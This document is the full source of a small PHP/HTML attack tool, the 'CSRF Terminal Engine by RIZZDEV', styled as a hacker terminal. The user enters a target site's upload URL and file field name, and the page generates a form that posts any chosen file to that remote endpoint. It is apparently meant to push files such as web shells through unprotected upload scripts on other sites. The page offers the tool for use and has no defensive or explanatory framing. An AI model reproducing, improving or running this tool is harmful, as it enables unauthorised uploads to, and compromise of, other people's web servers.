<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>[ RIZZDEV | CSRF TERMINAL ]</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #000;
      color: #00ff00;
      font-family: 'Courier New', Courier, monospace;
      padding: 20px;
    }
    h1, h2, h3 {
      color: #00ff00;
    }
    input[type="text"], input[type="file"] {
      background: #111;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 5px;
      width: 90%;
      margin-top: 10px;
    }
    .btn {
      background: #000;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 8px 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .btn:hover {
      background: #0f0;
      color: #000;
    }
    .output {
      margin-top: 20px;
      border-top: 1px dashed #0f0;
      padding-top: 10px;
    }
    ::selection {
      background: #0f0;
      color: #000;
    }
  </style>
</head>
<body>

<pre>
   _________  ____  ____________  ____  ____  ________
  / ____/   |/_  / / ____/ ____/ / __ \/ __ \/ ____/ /
 / /   / /| | / /_/ /   / __/   / /_/ / /_/ / __/ / / 
/ /___/ ___ |/ __/ /___/ /___  / _, _/ ____/ /___/_/  
\____/_/  |_/_/  \____/_____/ /_/ |_/_/   /_____(_)   

         >> CSRF Terminal Engine by RIZZDEV <<
</pre>

<form method="post">
  <label>Target URL:</label><br>
  <input type="text" name="url" placeholder="http://target.com/upload.php" required><br>

  <label>POST field name (file):</label><br>
  <input type="text" name="pf" placeholder="file / files[] / userfile" required><br>

  <input type="submit" name="submit" value="Lock Target" class="btn">
</form>

<?php
if (isset($_POST['submit'])) {
    $url = htmlspecialchars($_POST['url']);
    $pf  = htmlspecialchars($_POST['pf']);

    echo "<div class='output'>";
    echo "<h3>[+] Target Locked</h3>";
    echo "<p>URL: <span style='color:#fff;'>$url</span></p>";
    echo "<p>POST Field: <span style='color:#fff;'>$pf</span></p>";
    
    echo "<form method='post' action='$url' enctype='multipart/form-data' target='_blank'>
            <label>Choose file to send:</label><br>
            <input type='file' name='$pf' required><br>
            <input type='submit' value='CROOT 🚀' class='btn'>
          </form>";
    echo "</div>";
}
?>

</body>
</html>